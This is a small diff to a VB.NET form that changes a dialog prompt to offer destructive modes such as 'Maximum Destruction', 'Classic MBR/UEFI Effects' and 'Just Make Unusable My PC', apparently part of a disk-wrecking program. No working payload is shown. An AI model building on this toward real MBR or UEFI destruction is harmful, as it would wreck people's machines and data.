@@ -624,7 +624,7 @@ Public Class Form2
 
         If result = DialogResult.OK Then
             ' Create a simple input dialog
-            Dim choice As String = InputBox("Select your choice:", "User Choice", options(0))
+            Dim choice As String = InputBox("Select your choice: (Maximum Destruction, Classic MBR/UEFI Effects, Surprise Me, Just Make Unusable My PC Without Destruction)", "User Choice", options(0))
 
             ' Validate user choice against available options
             For Each opt In options ' Renamed the variable from 'option' to 'opt'
